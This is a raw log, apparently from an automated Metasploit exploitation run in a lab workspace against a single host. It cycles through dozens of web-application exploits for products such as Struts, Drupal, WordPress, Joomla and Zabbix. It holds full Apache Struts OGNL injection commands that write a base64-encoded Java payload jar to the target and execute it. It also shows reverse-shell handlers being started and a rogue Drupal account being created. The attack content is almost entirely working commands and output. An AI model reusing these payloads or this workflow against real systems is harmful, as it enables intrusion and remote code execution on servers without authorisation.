[*] [2016.06.04-09:45:03] [0290] Attempting to execute: #f=new java.io.FileOutputStream('Rslm5e0.jar'+#a,true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('yIucjp60NeCF8H4ztxPYuLaEUgoqoUyFx+EJFZ4CyoC+WrtHhVfgVYqi2g2JlAq/4SQi1piDxPNr8LoqTOMEWppvdSO2SYU34E1V0PBuVSiHx1RhOkMhMR0SZlBo19BqJss5i2WYMbUkdXdTCAm6MJuKkTBHFeYK83h1iCocKsynYBUOU4UFwuF8doQqHMmoFgpH8W2YSqpl16TIqyRhkSpUCJWqUCVUq/AoS1TCma/GNvvI7xyLCs7PXDmNxCDxx/WbeanpsXrNXHiNp7pm0j778bz8fNxqOSut/lR+BhsPo7a8U4n6lFaD8U4PF2xGpLTZlzTYcWaEGxoKggQMKoEpSo7VB9XhZEs7dwyOlasG5cTHGtN2fbTezkXzoo/tVfLbNTK/10nMKtzOcU/mjyUtmwQpIlrZjmQL6T5GAI7ZYfb2eZ1lIG4mKfbdhpWa2lKCrt9gW8l+h/KC00MWCBfu+fy9m+LcpB0enthOFYYOpM1ea/PkvjCbshYVymLc')),#f.close(),#a='CBf'
[*] [2016.06.04-09:45:04] [0290] Attempting to execute: #f=new java.io.FileOutputStream('Rslm5e0.jar'+#a,true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('UzYYKStF0Zn0WPGRhAhLC2A4SJxL/5+GcqLZp42fNaUccyM7oUwebJu0PYCWmsihNhvJfrOtmyGaCiIusvPt8/9zuF+4Yja0kTZTjmfZsvCURjfg2oyyruKmLLszcUALky9MC0/+onBznZUm5JXhg/1k4Fd5ylvTn3ISHIEKx0BuE5oQjtljdnNKcjGEcMEPp7wjUmDMpI+iCaSyh+T0RGpCOZ0ZPlBcMWhjOm2lc6BlE9K3yUHnt5OmSd9SYvg0Fk71Iqgt1TiYcCYwsNyykqbB3XdHVzt9HE6b8hFHyY4Iev0XwifCH//F5b3JlzttdifJ+rUeBlZYx5q1RKm8eQoXy3J1ssBD8oxEajN1CQgnFIiudQcZXtKAkXDcVouSCTl/aZ9X3KgadaTdrJrfGW+xHZMULHAFDx3AHD6LI378Nq9asu7s/g12NqXKpEfu3GxO3YU+4paT4cLrlrPFSijaUuMNIMLsnD9MaQ5Zqm4r7RWNI/9Hxs/ZVGH8OQcq')),#f.close(),#a='CBf'
[*] [2016.06.04-09:45:04] [0290] Attempting to execute: #f=new java.io.FileOutputStream('Rslm5e0.jar'+#a,true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('xE2T+9tA2J0CRozrE9ksnwmvjVzmJeSJTd+sPOedEHuFP18LR2RRjAqm4zaGNn8xm4Pehlt1z8lZV2RDv/trBGmB9k0uwz76YKcCnCVVoKtzCSwOT9BozocO2H65j+onIx1v5ZYdkFyDlUxmjcU4JObfzclBXq3sTyYprxbFze5EymzwvuaaCgUaidf88Z1mQWOraSrkyc051NOn/lLj6jtlDjSlKOumYlO6j/HG/QBJlRHkVfr8IHA9yBxM2A7RFvv67R4Oi1xrRUWhx7BbKGPnLB0wL+g3kvakpJ8Lakr6ou3+buLrs/rcD88spoYeg7BhAzXs4YZCXQ53ixySlAt7qQTVO1Mq3n4xq/5HCzAJpZRIxc1BLqEcMU0cUU0HKKWOxXy6H28MvWgd8Tu3ML+5riyQNFMbuQoGYvzU8ag0cAA0udTKxvvqZotaEY6FxtZTm5uiq/b/YJh367HRbA2Y6QbDzmt48mEKcA+HgQiPAIAfZnObTKvZ3Bi7M30N')),#f.close(),#a='CBf'
[*] [2016.06.04-09:45:04] [0290] Attempting to execute: #f=new java.io.FileOutputStream('Rslm5e0.jar'+#a,true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('uPOT2fkp91wB5N+eaPw57abRjPy+YgRwt/v7dxB+Ab8Ega/FLRAgEBDPGQOhawR8zeUgtoyBn9aBqgxIZTVltRmQMxDUFBoyUNRapakZKI6IurgHSip1MQMlPJRWamUZmBbx6/49cJ6maeWjMD0S0AMZCHWOwYyuLFY+mMn4Znn4RkCPSLqUgdkulC7p/hGYE5GrdL8uj8JcF+28zkrtEJ3YODQD82l9mLYgA4ePwhF1AbpgslIocAOeSzehgBgfhSMzsLAzx4TMLycyIU9lIuiSD2pHMXnF21TzukgvykA4A4s6q6r1IpelCq2S6GukoeptMLNKq3HBGUyrpScuzNFIIHv49pjx28Xe7Rgc26UrI7AkolbqKiM7Tiet1o3C8dK9sLTLp50wCpFol6gti3b5dWJxZrTLNUg0AydGivXiDJxEOuf5ZJqnwymjUE9PZ3T59CJ651Ljpwq904PRSImvrjRUqpfctwOO89WVhcrKlB1wpF4SKl1MutkGgSGY')),#f.close(),#a='CBf'
[*] [2016.06.04-09:45:04] [0290] Attempting to execute: #f=new java.io.FileOutputStream('Rslm5e0.jar'+#a,true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('md0tnw4NhG1rGQ7te3FrKY2PDgkn69IeuNqzEGtLHobG62B1OczQVor3wqldvmFYRcw16TJtT+Pt6bRt7hyCBZEgyRXw5GplodqYM1eUDLQThBIJsoxrCEx0wbzLTpeG5lmPxzAvhnC4UotqHVkHkCu1tazpSJDM4i6UkLwdyobhjEjRMHRG1CF4QFf2wGW6op3pGmz2GHSR+snnztLWZeDsETgnUjQEawnAs+hJY3Cua5/1GTgvUqwZo7BBi3lilkOcxURPSr3YFZLtYDKOaXkvuyNFY7CR3K2HeThJD+6B8jFIkFuF5BE4P1I8xJxs6uJdMlKil2Sgl0xLU4rxWeR4NPWRi3i+xGbfAx3aBcxNOpDlxiaFloNDGi2HpS5nAY8z1w1U1rTL4/3QT/+YjG/x/WAT8hKRFk5EHYPNubjQBigeKrVB17290NC2jMCFHncXkW0ipa736KXkSOV6Ka3o4uKo6yxvj4FIWD6pF+nE8yXMs146Ap/aDYJwvNAl')),#f.close(),#a='CBf'
[+] [2016.06.04-09:45:04] Workspace:lab5 Progress:295/775 (38%) [291/770] 10.198.0.1:8080 - Splunk Search Remote Code Execution
[-] [2016.06.04-09:45:04] No reverse connect payloads available for exploit/multi/http/splunk_mappy_exec
[-] [2016.06.04-09:45:04] No payloads were compatible with exploit/multi/http/splunk_mappy_exec)
[-] [2016.06.04-09:45:04] [0291] Exploit failed: A payload has not been selected.
[*] [2016.06.04-09:45:04] [0290] Attempting to execute: #f=new java.io.FileOutputStream('Rslm5e0.jar'+#a,true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('nA0tNF8kXAKrKQ09S/9Fyk2rKWM9B897CQnW0plEc1NFjqVLmSWPF8o7rRw6VRw54rQyuEeO+Kt1fwY+3VUXEG6EMl3U/b4QpZjLhva9xWmpzst5TCxAJH4FL4DGv1Vlyb1PxIpofmUMLu+qHIGtEf8YXEF0r+SkNAZX0fIzGfjsGFxNOrqmi82rfY7M67sXPj8CX+Bg+GJErn4YTmA2vlQXDAWJKYWSF+XLL1dUoK74QkF23q90RYivr+4H277v+SGYk5PyayRhtSclmdfLm1+nsAho38hZ+vI8S3/TDbVg1tR+uqliS4vZkNM4DY/BNtbUdRn41m63BjxOFeLaSZp/CV7OVoqzSCUCza3YPAzXb4N5WdaGYTtnyhs85ipG4cbmyocn396Uf7sHZDLYzF20+/YuV/0K/zqVpVNJVJibQ7MYKugpBfo2kLUdQ+DXsrbOPXwFXs0+XExMizQvJLzfacFWitWd20DnnFRVSaQotbaSCndeB35src69fw1e')),#f.close(),#a='CBf'
[*] [2016.06.04-09:45:05] [0290] Attempting to execute: #f=new java.io.FileOutputStream('Rslm5e0.jar'+#a,true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('z76/i14HaL5tDG4mwrc0E56hlsoqH+W8Wzs5CqrExcPwXfJ3xvO9bdBA08URUfs+e9IPOEnue0u7LbuZS4z+0L8DVGaAqqu+iw5u52zmFsVbO4f23TMGu4jS7ojoq/OH/PxgBxwR8os7QdXFYRjOwB2dulgZIp+4MwM/6tzqpzB6wc2yhCLDSLNivAFvemJgkMSQ6exDen9iRVntHKrPZWfzeDq2VJRFMjBy8rwb4EpXp5fOE8+rEyt8IUI32kKqvosdPFfeg/TqbtJ1i+4PiUvm3ARKSBTPIyOExDoxx3uANlKIyjJFfJgAJQYs4YUYXzLnRloG3FOWZatE/D/Hvps5fQhWE70xkvWUCqJ+D72qq5hDkt5LDM1hQu4yJPp3QilzyAejQyBWtFQQb2OUnQlHMRmkhd+fdbrfLQ3k52JF1FOLDL/d3+jUu84LcJx23yj8eBjuz8ADd8CD2kO0uwN+ov10GB4ku90B1w/Tbo+7bNQedm+3e0kC/gtQSwME')),#f.close(),#a='CBf'
[+] [2016.06.04-09:45:05] Workspace:lab5 Progress:296/775 (38%) [292/770] 10.198.0.1:8080 - Log1 CMS writeInfo() PHP Code Injection
[*] [2016.06.04-09:45:05] [0290] Attempting to execute: #f=new java.io.FileOutputStream('Rslm5e0.jar'+#a,true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('FAAAAAAAok3ESAAAAAAAAAAAAAAAAAkAAABNRVRBLUlORi9QSwMEFAAAAAgAok3ESH6aFUZiAAAAkQAAABQAAABNRVRBLUlORi9NQU5JRkVTVC5NRvNNzMtMSy0u0Q1LLSrOzM+zUjDUM+Dl8k3MzNN1zkksLrZSyE0tSSwuyMnPLNELSKzMyU9M4eUKSC3KzSwGaQAqSMzJ0S1ACPBy8XL5JeamouhMSSzBJq4PNVEvGWQXSAUAUEsBAhQAFAAAAAgAok3ESNsqELMjAAAAJAAAAA4AAAAAAAAAAAAAAAAAAAAAAG1ldGFzcGxvaXQuZGF0UEsBAhQAFAAAAAAAok3ESAAAAAAAAAAAAAAAAAsAAAAAAAAAAAAAAAAATwAAAG1ldGFzcGxvaXQvUEsBAhQAFAAAAAgAok3ESHB7Ld9OEQAAQSEAABgAAAAAAAAAAAAAAAAAeAAAAG1ldGFzcGxvaXQvUGF5bG9hZC5jbGFzc1BLAQIUABQAAAAAAKJN')),#f.close(),#a='CBf'
[*] [2016.06.04-09:45:05] [0292] Started reverse TCP handler on 0.0.0.0:1198
[*] [2016.06.04-09:45:05] [0292] Sending PHP payload (1305 bytes)
[*] [2016.06.04-09:45:05] [0290] Attempting to execute: #f=new java.io.FileOutputStream('Rslm5e0.jar'+#a,true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('xEgAAAAAAAAAAAAAAAAJAAAAAAAAAAAAAAAAAPwRAABNRVRBLUlORi9QSwECFAAUAAAACACiTcRIfpoVRmIAAACRAAAAFAAAAAAAAAAAAAAAAAAjEgAATUVUQS1JTkYvTUFOSUZFU1QuTUZQSwUGAAAAAAUABQA0AQAAtxIAAAAA')),#f.close(),#a='CBf'
[*] [2016.06.04-09:45:05] [0292] Requesting data.php
[*] [2016.06.04-09:45:05] [0290] Attempting to execute: #q=@java.lang.Class@forName('ognl.OgnlRuntime').getDeclaredField('_jdkChecked'),#q.setAccessible(true),#q.set(null,true),#q=@java.lang.Class@forName('ognl.OgnlRuntime').getDeclaredField('_jdk15'),#q.setAccessible(true),#q.set(null,false),#cl=new java.net.URLClassLoader(new java.net.URL[]{new java.io.File('Rslm5e0.jar'+#a).toURI().toURL()}),#a='pkEr',#c=#cl.loadClass('metasploit.Payload'),#c.getMethod('main',new java.lang.Class[]{@java.lang.Class@forName('[Ljava.lang.String;')}).invoke(null,new java.lang.Object[]{new java.lang.String[0]})
[!] [2016.06.04-09:45:07] [0290] This exploit may require manual cleanup of 'Rslm5e0.jarnull' on the target
[!] [2016.06.04-09:45:07] [0290] This exploit may require manual cleanup of 'Rslm5e0.jarCBf' on the target
[+] [2016.06.04-09:45:08] Workspace:lab5 Progress:297/775 (38%) [293/770] 10.198.0.1:80 - Gitlab-shell Code Execution
[*] [2016.06.04-09:45:08] [0293] Started reverse TCP handler on 0.0.0.0:1199
[+] [2016.06.04-09:45:08] Workspace:lab5 Progress:298/775 (38%) [294/770] 10.198.0.1:80 - Graphite Web Unsafe Pickle Handling
[-] [2016.06.04-09:45:08] No reverse connect payloads available for exploit/unix/webapp/graphite_pickle_exec
[-] [2016.06.04-09:45:08] No payloads were compatible with exploit/unix/webapp/graphite_pickle_exec)
[-] [2016.06.04-09:45:08] [0294] Exploit failed: A payload has not been selected.
[-] [2016.06.04-09:45:08] [0293] Exploit aborted due to failure: no-access: 10.198.0.1:80 - Unable to get session cookie
[+] [2016.06.04-09:45:09] Workspace:lab5 Progress:299/775 (38%) [295/770] 10.198.0.1:80 - Zabbix 2.0.8 SQL Injection and Remote Code Execution
[-] [2016.06.04-09:45:09] No reverse connect payloads available for exploit/linux/http/zabbix_sqli
[-] [2016.06.04-09:45:09] No payloads were compatible with exploit/linux/http/zabbix_sqli)
[-] [2016.06.04-09:45:09] [0295] Exploit failed: A payload has not been selected.
[*] [2016.06.04-09:45:09] [0295] Cleaning script remnants
[!] [2016.06.04-09:45:09] [0295] Unable to remove script
[+] [2016.06.04-09:45:09] Workspace:lab5 Progress:300/775 (38%) [296/770] 10.198.0.1:80 - Network Shutdown Module (sort_values) Remote PHP Code Injection
[*] [2016.06.04-09:45:09] [0296] Started reverse TCP handler on 0.0.0.0:1200
[*] [2016.06.04-09:45:09] [0296] 10.198.0.1:80 - Sending payload
[+] [2016.06.04-09:45:10] Workspace:lab5 Progress:301/775 (38%) [297/770] 10.198.0.1:80 - SugarCRM unserialize() PHP Code Execution
[+] [2016.06.04-09:45:10] Workspace:lab5 Progress:302/775 (38%) [298/770] 10.198.0.1:80 - Tiki Wiki unserialize() PHP Code Execution
[*] [2016.06.04-09:45:10] [0298] Started reverse TCP handler on 0.0.0.0:1202
[*] [2016.06.04-09:45:10] [0298] Disclosing the path of the Tiki Wiki on the filesystem
[-] [2016.06.04-09:45:10] [0298] Tiki Wiki path couldn't be disclosed. The php setting 'display_errors' must be On.
[+] [2016.06.04-09:45:12] Workspace:lab5 Progress:303/775 (39%) [299/770] 10.198.0.1:80 - Avaya IP Office Customer Call Reporter ImageUpload.ashx Remote Command Execution
[*] [2016.06.04-09:45:12] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:45:12] [0299] Started reverse TCP handler on 0.0.0.0:1203
[*] [2016.06.04-09:45:13] [0299] Uploading 56188 bytes through /CCRWebClient/Wallboard/ImageUpload.ashx...
[-] [2016.06.04-09:45:13] [0299] Payload upload failed
[+] [2016.06.04-09:45:13] Workspace:lab5 Progress:304/775 (39%) [300/770] 10.198.0.1:8080 - V-CMS PHP File Upload and Execute
[*] [2016.06.04-09:45:14] [0300] Started reverse TCP handler on 0.0.0.0:1204
[*] [2016.06.04-09:45:14] [0300] 10.198.0.1:8080 Uploading payload: HOlYw.php
[*] [2016.06.04-09:45:14] [0300] 10.198.0.1:8080 replies status: 404
[*] [2016.06.04-09:45:14] [0300] 10.198.0.1:8080 Executing payload: HOlYw.php
[-] [2016.06.04-09:45:14] [0300] 10.198.0.1:8080 404 - the upload probably failed
[+] [2016.06.04-09:45:16] Workspace:lab5 Progress:305/775 (39%) [301/770] 10.198.0.1:80 - Nagios XI Network Monitor Graph Explorer Component Command Injection
[-] [2016.06.04-09:45:17] No reverse connect payloads available for exploit/unix/webapp/nagios_graph_explorer
[-] [2016.06.04-09:45:17] No payloads were compatible with exploit/unix/webapp/nagios_graph_explorer)
[+] [2016.06.04-09:45:17] Workspace:lab5 Progress:306/775 (39%) [302/770] 10.198.0.1:80 - Wordpress Front-end Editor File Upload
[*] [2016.06.04-09:45:17] [0302] Started reverse TCP handler on 0.0.0.0:1205
[*] [2016.06.04-09:45:17] [0302] Trying to upload payload
[*] [2016.06.04-09:45:17] [0302] Uploading payload
[-] [2016.06.04-09:45:17] [0302] Exploit aborted due to failure: unknown: 10.198.0.1:80 - Unexpected response, exploit probably failed!
[+] [2016.06.04-09:45:18] Workspace:lab5 Progress:307/775 (39%) [303/770] 10.198.0.1:8080 - Joomla 1.5.12 TinyBrowser File Upload Code Execution
[*] [2016.06.04-09:45:18] [0303] Started reverse TCP handler on 0.0.0.0:1206
[-] [2016.06.04-09:45:18] [0303] Error retrieving obfuscation code!
[+] [2016.06.04-09:45:21] Workspace:lab5 Progress:308/775 (39%) [304/770] 10.198.0.1:80 - GE Proficy CIMPLICITY gefebt.exe Remote Code Execution
[*] [2016.06.04-09:45:21] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:45:21] [0304] Started reverse TCP handler on 0.0.0.0:1207
[-] [2016.06.04-09:45:21] [0304] Exploit aborted due to failure: bad-config: Using WebDAV requires SRVPORT=80 and URIPATH=/
[+] [2016.06.04-09:45:21] Workspace:lab5 Progress:309/775 (39%) [305/770] 10.198.0.1:80 - Horde Framework Unserialize PHP Code Execution
[*] [2016.06.04-09:45:22] [0305] Started reverse TCP handler on 0.0.0.0:1209
[*] [2016.06.04-09:45:22] [0305] Testing injection...
[-] [2016.06.04-09:45:22] [0305] Exploit aborted due to failure: not-vulnerable: 10.198.0.1:80 - Target isn't vulnerable, exiting...
[+] [2016.06.04-09:45:22] Workspace:lab5 Progress:310/775 (40%) [306/770] 10.198.0.1:80 - Oracle Event Processing FileUploadServlet Arbitrary File Upload
[*] [2016.06.04-09:45:22] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-09:45:22] [0306] Started reverse TCP handler on 0.0.0.0:1210
[*] [2016.06.04-09:45:22] [0306] Generating payload and mof file...
[*] [2016.06.04-09:45:24] [0306] Uploading the exe payload dVgWoaX.exe...
[-] [2016.06.04-09:45:24] [0306] Unexpected answer, trying anyway...
[*] [2016.06.04-09:45:24] [0306] Uploading the MOF file wwhVM.mof
[+] [2016.06.04-09:46:42] Workspace:lab5 Progress:311/775 (40%) [307/770] 10.198.0.1:80 - F5 iControl Remote Root Command Execution
[-] [2016.06.04-09:46:42] No reverse connect payloads available for exploit/linux/http/f5_icontrol_exec
[-] [2016.06.04-09:46:42] No payloads were compatible with exploit/linux/http/f5_icontrol_exec)
[-] [2016.06.04-09:46:42] [0307] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:46:42] Workspace:lab5 Progress:312/775 (40%) [308/770] 10.198.0.1:8080 - Redmine SCM Repository Arbitrary Command Execution
[-] [2016.06.04-09:46:42] No reverse connect payloads available for exploit/unix/webapp/redmine_scm_exec
[-] [2016.06.04-09:46:42] No payloads were compatible with exploit/unix/webapp/redmine_scm_exec)
[-] [2016.06.04-09:46:42] [0308] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:46:43] Workspace:lab5 Progress:313/775 (40%) [309/770] 10.198.0.1:8080 - Family Connections less.php Remote Command Execution
[-] [2016.06.04-09:46:43] No reverse connect payloads available for exploit/multi/http/familycms_less_exec
[-] [2016.06.04-09:46:43] No payloads were compatible with exploit/multi/http/familycms_less_exec)
[-] [2016.06.04-09:46:43] [0309] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:46:43] Workspace:lab5 Progress:314/775 (40%) [310/770] 10.198.0.1:80 - Drupal HTTP Parameter Key/Value SQL Injection
[*] [2016.06.04-09:46:44] [0310] Started reverse TCP handler on 0.0.0.0:1211
[*] [2016.06.04-09:46:44] [0310] Testing page
[*] [2016.06.04-09:46:44] [0310] form_build_id:
[*] [2016.06.04-09:46:44] [0310] form_token:
[*] [2016.06.04-09:46:44] [0310] password hash: $P\$8RKwTEZcA0gs5SgeX8apHIah8RLQy40
[*] [2016.06.04-09:46:44] [0310] Creating new user yDJavoCvgp:srGFPVjUlQ
[*] [2016.06.04-09:46:44] [0310] Logging in as yDJavoCvgp:srGFPVjUlQ
[*] [2016.06.04-09:46:44] [0310] cookie: ATutorID=rh1r4tv3lapuj3blf44uahdvt0; ATutorID=k09iuiulf537fdcrnueup5ap01; ATutorID=k09iuiulf537fdcrnueup5ap01;
[*] [2016.06.04-09:46:44] [0310] Trying to parse enabled modules
[*] [2016.06.04-09:46:44] [0310] form_build_id:
[*] [2016.06.04-09:46:44] [0310] form_token:
[*] [2016.06.04-09:46:44] [0310] Enabling the PHP filter module
[*] [2016.06.04-09:46:44] [0310] Setting permissions for PHP filter module
[*] [2016.06.04-09:46:44] [0310] form_build_id:
[*] [2016.06.04-09:46:44] [0310] form_token:
[*] [2016.06.04-09:46:44] [0310] admin role id:
[-] [2016.06.04-09:46:44] [0310] Exploit aborted due to failure: unknown: Could not parse out administrator ID
[+] [2016.06.04-09:46:45] Workspace:lab5 Progress:315/775 (40%) [311/770] 10.198.0.1:8080 - Horde 3.3.12 Backdoor Arbitrary PHP Code Execution
[-] [2016.06.04-09:46:45] No reverse connect payloads available for exploit/multi/http/horde_href_backdoor
[-] [2016.06.04-09:46:45] No payloads were compatible with exploit/multi/http/horde_href_backdoor)
[-] [2016.06.04-09:46:45] [0311] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:46:45] Workspace:lab5 Progress:316/775 (40%) [312/770] 10.198.0.1:8080 - OP5 license.php Remote Command Execution
[-] [2016.06.04-09:46:45] No reverse connect payloads available for exploit/multi/http/op5_license
[-] [2016.06.04-09:46:45] No payloads were compatible with exploit/multi/http/op5_license)
[-] [2016.06.04-09:46:45] [0312] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:46:46] Workspace:lab5 Progress:317/775 (40%) [313/770] 10.198.0.1:80 - AlienVault OSSIM av-centerd Command Injection
[-] [2016.06.04-09:46:46] No reverse connect payloads available for exploit/linux/ids/alienvault_centerd_soap_exec
[-] [2016.06.04-09:46:46] No payloads were compatible with exploit/linux/ids/alienvault_centerd_soap_exec)
[-] [2016.06.04-09:46:46] [0313] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:46:47] Workspace:lab5 Progress:318/775 (41%) [314/770] 10.198.0.1:8080 - OP5 welcome Remote Command Execution
[-] [2016.06.04-09:46:47] No reverse connect payloads available for exploit/multi/http/op5_welcome
[-] [2016.06.04-09:46:47] No payloads were compatible with exploit/multi/http/op5_welcome)
[-] [2016.06.04-09:46:47] [0314] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:46:47] Workspace:lab5 Progress:319/775 (41%) [315/770] 10.198.0.1:8080 - Symantec Web Gateway 5.0.2.8 relfile File Inclusion Vulnerability
[*] [2016.06.04-09:46:47] [0315] Started reverse TCP handler on 0.0.0.0:1212
[*] [2016.06.04-09:46:47] [0315] 10.198.0.1:8080 doesn't look like Symantec Web Gateway, will not engage.
[+] [2016.06.04-09:49:32] Workspace:lab5 Progress:320/775 (41%) [316/770] 10.198.0.1:80 - Centreon SQL and Command Injection
[-] [2016.06.04-09:49:32] No reverse connect payloads available for exploit/linux/http/centreon_sqli_exec
[-] [2016.06.04-09:49:32] No payloads were compatible with exploit/linux/http/centreon_sqli_exec)
[-] [2016.06.04-09:49:32] [0316] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:49:33] Workspace:lab5 Progress:321/775 (41%) [317/770] 10.198.0.1:80 - Gitlist Unauthenticated Remote Command Execution
[-] [2016.06.04-09:49:33] No reverse connect payloads available for exploit/linux/http/gitlist_exec
[-] [2016.06.04-09:49:33] No payloads were compatible with exploit/linux/http/gitlist_exec)
[-] [2016.06.04-09:49:33] [0317] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:49:33] Workspace:lab5 Progress:322/775 (41%) [318/770] 10.198.0.1:8080 - Symantec Web Gateway 5.0.2.8 ipchange.php Command Injection
[-] [2016.06.04-09:49:33] No reverse connect payloads available for exploit/linux/http/symantec_web_gateway_exec
[-] [2016.06.04-09:49:33] No payloads were compatible with exploit/linux/http/symantec_web_gateway_exec)
[-] [2016.06.04-09:49:33] [0318] Exploit failed: A payload has not been selected.
[+] [2016.06.04-09:49:34] Workspace:lab5 Progress:323/775 (41%) [319/770] 10.198.0.1:80 - Wordpress SlideShow Gallery Authenticated File Upload
[+] [2016.06.04-09:49:35] Workspace:lab5 Progress:324/775 (41%) [320/770] 10.198.0.1:80 - Wordpress InfusionSoft Upload Vulnerability
[*] [2016.06.04-09:49:35] [0320] Started reverse TCP handler on 0.0.0.0:1214
[-] [2016.06.04-09:49:35] [0320] Exploit aborted due to failure: unexpected-reply: 10.198.0.1:80 - Unable to deploy payload, server returned 302
[+] [2016.06.04-09:49:35] Workspace:lab5 Progress:325/775 (41%) [321/770] 10.198.0.1:8080 - Symantec Web Gateway 5.0.2.8 Arbitrary PHP File Upload Vulnerability
[*] [2016.06.04-09:49:35] [0321] Started reverse TCP handler on 0.0.0.0:1215
[*] [2016.06.04-09:49:35] [0321] Sending PHP payload (nEfYIVgpMoZxF.php)
[-] [2016.06.04-09:49:35] [0321] File wasn't uploaded, aborting!
[+] [2016.06.04-09:49:38] Workspace:lab5 Progress:326/775 (42%) [322/770] 10.198.0.1:80 - Joomla Akeeba Kickstart Unserialize Remote Code Execution
[*] [2016.06.04-09:49:38] [0322] Started reverse TCP handler on 0.0.0.0:1216
[*] [2016.06.04-09:49:38] [0322] Using URL: http://0.0.0.0:1217/RNdXXSdct
[*] [2016.06.04-09:49:38] [0322] Local IP: http://10.0.2.15:1217/RNdXXSdct
[*] [2016.06.04-09:49:38] [0322] Server started.
[*] [2016.06.04-09:49:38] [0322] Creating archive with file uLLDHQiPXKKtw.php
[*] [2016.06.04-09:49:38] [0322] Sending PHP serialized object...
[*] [2016.06.04-09:49:38] [0322] 302
[-] [2016.06.04-09:49:38] [0322] Exploit aborted due to failure: unknown: 10.198.0.1:80 - Unexpected response
[*] [2016.06.04-09:49:38] [0322] Server stopped.
[+] [2016.06.04-09:49:38] Workspace:lab5 Progress:327/775 (42%) [323/770] 10.198.0.1:8080 - Apache Struts Remote Command Execution
[*] [2016.06.04-09:49:38] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[+] [2016.06.04-09:49:39] Workspace:lab5 Progress:328/775 (42%) [324/770] 10.198.0.1:8080 - Apache Struts 2 Developer Mode OGNL Execution
[*] [2016.06.04-09:49:39] [0324] Started reverse TCP handler on 0.0.0.0:1219
[*] [2016.06.04-09:49:39] [0324] Attempting to execute: #f=new java.io.FileOutputStream('pjHz8Ix.jar',false),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('UEsDBBQAAAAIACdOxEgD+TUxIwAAACQAAAAOAAAAbWV0YXNwbG9pdC5kYXQLLkgsz7M14vLx8A8OsTU00DO0tNAz0AMKBPgHAQWMDC25AFBLAwQUAAAAAAAnTsRIAAAAAAAAAAAAAAAACwAAAG1ldGFzcGxvaXQvUEsDBBQAAAAIACdOxEhwey3fThEAAEEhAAAYAAAAbWV0YXNwbG9pdC9QYXlsb2FkLmNsYXNzlRgJeBTl9b3Z2Z3ZyeRgwgLDoYiKS05FjLh4NIQg0VywwRhRcdidkJXNTtyZkKDWWkVttfcpVtRSNPawQrSbaNR6tHjUs61ardaztNbWWrV3lb43s0s2yWJpPvjP97/7mn3so7vvA4BjhBoFHoG9EvxOAYHn30vwlgJ+2KvAqfAHBZbC27z9owx/4vkdGf7MN+8y+F8UsOE9Gd7nzQcy/FWGvykwA/7Owz8k+CfP/5Lh3zz/h4cPefhIARH20RsEGZFOUOCNT0ZRRj8vAwpKKBNx')),#f.close()
[*] [2016.06.04-09:49:42] [0324] Attempting to execute: #f=new java.io.FileOutputStream('pjHz8Ix.jar',true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('DPJWkbGIwVQeimUskbFUxjK+nyajJmO5jNNlDMk4Q8KZChyLs/iZTit4T8HZOEfCuTLOI7p4iIyH8tF8BQ/DBTwc7gf3T3pawSPwSKaxMHsE8SA9OUrGsISLgliBlSQ7VklYzZsaBWvxaAmPkXGxjMcyriUSHqfAaqyT8XgZl8p4QhAjuIyHE2U8ScKTmelTZPwEz/UKdOFyCRsUOJf1cy6ukLGRSayU8VQJVykQJx7pvEnC0xTYSAbC0xVIYLOELQpswlYe2mggOel4AQ/tMq6WcY2EUQk7JFwr4Rkydsp4poxdCmzGs3hYx8PZbIi9Mp7DijlXxvVkTzyP9WdIuEGByzEmYVyBK5iuqcBV7BVXYLeEGyXskTEh4fkKXIObFLgakwzfy0OK0Vk89Ml4AYuTltGW0JGwX8LNCmzDAQWuxUFW7hYeLpTxIoa/WMZP8nyJjJ/i+VI2xqclvEyBm5m2iJfTCrcG6fgKluBKGa9iTX5Gxs/yzdU8XCPh5xTY')),#f.close()
[*] [2016.06.04-09:49:42] [0324] Attempting to execute: #f=new java.io.FileOutputStream('pjHz8Ix.jar',true),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('BXsZ7PO0wi/w8Rd59SW+eIeffJmHr/DwVXJs/Bqvvs7DN3j4pozXKhiBD4K4Da/jk28xo9fLuJ3nG2S8UcabZPy2hDsQpLbo+tb6lkYErfl8Y7NRmzRSG2ujTjqR2riMvLy9vmPV+mhjO0KgKbq+vulMBDzL26xoiyIET6s/o379qjbGEDgxkUo4JyP4wovOQBAbrLhJU6+RSCHMCK+bSoDBlMbBmNnnJKyUjTBtIJ1wzMbeDWY8bsZXJpKEYEk472FD0rDtZVMxeScJq5bfEF4JvyPhTuJvg2U5tpM2+hCi4f1QTam+foeemkbv+NO2fmfyaT6JA/BfttF0TkubjYNmrN8xNjDHC8MFQAupVzXi8cZBx0zZJD4x251IxZtSKxLpSVJPELIA1pzchCJlpXuNZOJCYmNB+CAeSPGEbZsxB+GoQuDrCnrFibGka2oVnoZnEKa7MP1OIlnbnrb6zLSTMMmYWq/pGHZf0ko4te3GlqRlxBFmTsa3vD+RjJtp')),#f.close()
